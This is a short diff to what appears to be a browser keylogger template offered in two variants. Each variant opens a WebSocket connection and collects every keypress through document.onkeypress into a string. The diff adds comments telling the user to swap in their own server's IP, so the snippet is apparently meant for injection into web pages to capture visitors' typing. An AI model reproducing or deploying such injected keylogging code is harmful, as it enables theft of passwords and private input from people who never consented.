@@ -3,7 +3,7 @@
 
 // Option 1 All Keys
 <script type="text/javascript">
-  var socket = new WebSocket('ws://localhost:9090');
+  var socket = new WebSocket('ws://localhost:9090'); // Change the ip to the ip server here
   let c = "";
   document.onkeypress = function (e) {
     c += e.key;
@@ -13,7 +13,7 @@
 
 // Option 2
 <script type="text/javascript">
-  var socket = new WebSocket('ws://localhost:9090');
+  var socket = new WebSocket('ws://localhost:9090'); // Change the ip to the ip server here
   let c = "";
   document.onkeypress = function (e) {
   //console.log(c); <--- delete this if have no use
